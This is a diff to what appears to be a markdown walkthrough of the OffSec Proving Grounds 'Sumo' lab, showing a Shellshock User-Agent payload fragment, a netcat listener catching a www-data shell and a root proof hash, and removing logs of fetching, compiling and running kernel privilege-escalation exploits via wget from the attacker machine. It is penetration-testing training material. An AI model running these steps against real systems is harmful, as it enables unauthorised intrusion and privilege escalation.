@@ -149,9 +149,6 @@ root@kali:/OSCPv3/offsec_pg/Sumo# curl -H 'User-Agent: () { :; }; echo ; echo ; 
 ```console
 root@kali:/OSCPv3/offsec_pg/Sumo# nc -lvnp 80
 listening on [any] 80 ...
-connect to [192.168.49.80] from (UNKNOWN) [192.168.80.87] 38622
-root@kali:/OSCPv3/offsec_pg/Sumo# nc -lvnp 80
-listening on [any] 80 ...
 connect to [192.168.49.80] from (UNKNOWN) [192.168.80.87] 38623
 whoami
 www-data
@@ -337,103 +334,12 @@ firefart@ubuntu:~# cat proof.txt
 2c27ea86bf112135dec9a9b117d33db1
 ```
 
+https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html#enumeration
 
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#perl
 
+https://book.hacktricks.xyz/linux-unix/privilege-escalation
 
+https://www.sevenlayers.com/index.php/125-exploiting-shellshock
 
-
-
-root@kali:/OSCPv3/offsec_pg/Sumo# searchsploit Linux kernel Ubuntu Ubuntu 12.04
--------------------------------------------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                                                                |  Path
--------------------------------------------------------------------------------------------------------------- ---------------------------------
-Linux Kernel (Ubuntu 11.10/12.04) - binfmt_script Stack Data Disclosure                                       | linux/dos/41767.txt
-Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation          | linux/local/37292.c
-Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Access  | linux/local/37293.txt
-Linux Kernel 3.2.0-23/3.5.0-23 (Ubuntu 12.04/12.04.1/12.04.2 x64) - 'perf_swevent_init' Local Privilege Escal | linux_x86-64/local/33589.c
-Linux Kernel < 3.2.0-23 (Ubuntu 12.04 x64) - 'ptrace/sysret' Local Privilege Escalation                       | linux_x86-64/local/34134.c
-Linux Kernel < 3.5.0-23 (Ubuntu 12.04.2 x64) - 'SOCK_DIAG' SMEP Bypass Local Privilege Escalation             | linux/local/44299.c
--------------------------------------------------------------------------------------------------------------- ---------------------------------
-Shellcodes: No Results
-Papers: No Results
-
-
-root@kali:/OSCPv3/offsec_pg/Sumo# searchsploit -m 34134
-  Exploit: Linux Kernel < 3.2.0-23 (Ubuntu 12.04 x64) - 'ptrace/sysret' Local Privilege Escalation
-      URL: https://www.exploit-db.com/exploits/34134
-     Path: /usr/share/exploitdb/exploits/linux_x86-64/local/34134.c
-File Type: C source, ASCII text, with CRLF line terminators
-
-Copied to: /OSCPv3/offsec_pg/Sumo/34134.c
-
-
-
-www-data@ubuntu:/tmp$ wget http://192.168.49.222:9090/34134.c
---2021-11-04 11:06:15--  http://192.168.49.222:9090/34134.c
-Connecting to 192.168.49.222:9090... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 3551 (3.5K) [text/plain]
-Saving to: `34134.c'
-
-100%[======================================================================================================>] 3,551       --.-K/s   in 0s      
-
-2021-11-04 11:06:15 (16.4 MB/s) - `34134.c' saved [3551/3551]
-
-
-www-data@ubuntu:/tmp$ gcc 34134.c -o 34134   
-34134.c: In function 'main':
-34134.c:62:2: warning: passing argument 1 of 'mmap' makes pointer from integer without a cast [enabled by default]
-/usr/include/x86_64-linux-gnu/sys/mman.h:58:14: note: expected 'void *' but argument is of type 'unsigned int'
-34134.c:63:2: warning: comparison between pointer and integer [enabled by default]
-34134.c:64:2: warning: incompatible implicit declaration of built-in function 'memset' [enabled by default]
-34134.c:67:9: warning: incompatible implicit declaration of built-in function 'memcpy' [enabled by default]
-34134.c:74:3: warning: incompatible implicit declaration of built-in function 'exit' [enabled by default]
-34134.c:80:4: warning: incompatible implicit declaration of built-in function 'exit' [enabled by default]
-www-data@ubuntu:/tmp$ ls
-34134  34134.c	40839  40839.c	passwd.bak  vmware-root
-www-data@ubuntu:/tmp$ ./34134 
-IDT addr = 0xffffffff81dd7000
-
-
-
-
-root@kali:/OSCPv3/offsec_pg/Sumo# searchsploit -m 33589
-  Exploit: Linux Kernel 3.2.0-23/3.5.0-23 (Ubuntu 12.04/12.04.1/12.04.2 x64) - 'perf_swevent_init' Local Privilege Escalation (3)
-      URL: https://www.exploit-db.com/exploits/33589
-     Path: /usr/share/exploitdb/exploits/linux_x86-64/local/33589.c
-File Type: C source, ASCII text, with CRLF line terminators
-
-Copied to: /OSCPv3/offsec_pg/Sumo/33589.c
-
-
-www-data@ubuntu:/tmp$ wget http://192.168.49.222:9090/33589.c
---2021-11-04 11:10:44--  http://192.168.49.222:9090/33589.c
-Connecting to 192.168.49.222:9090... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 3664 (3.6K) [text/plain]
-Saving to: `33589.c'
-
-100%[======================================================================================================>] 3,664       --.-K/s   in 0s      
-
-2021-11-04 11:10:44 (15.1 MB/s) - `33589.c' saved [3664/3664]
-
-
-www-data@ubuntu:/tmp$ gcc 33589.c -O2 -o 33589   
-gcc: error trying to exec 'cc1': execvp: No such file or directory
-www-data@ubuntu:/tmp$ locate cc1
-/etc/ssl/certs/6fcc125d.0
-/usr/lib/gcc/x86_64-linux-gnu/4.6/cc1
-/usr/share/doc/libgcc1
-/usr/share/lintian/overrides/libgcc1
-/var/lib/dpkg/info/libgcc1:amd64.list
-/var/lib/dpkg/info/libgcc1:amd64.md5sums
-/var/lib/dpkg/info/libgcc1:amd64.postinst
-/var/lib/dpkg/info/libgcc1:amd64.postrm
-/var/lib/dpkg/info/libgcc1:amd64.shlibs
-/var/lib/dpkg/info/libgcc1:amd64.symbols
-www-data@ubuntu:/tmp$ PATH=${PATH}:/usr/lib/gcc/x86_64-linux-gnu/4.6    
-www-data@ubuntu:/tmp$ export PATH
-www-data@ubuntu:/tmp$ gcc 33589.c -O2 -o 33589
-www-data@ubuntu:/tmp$ ./33589 0
-
-
+https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
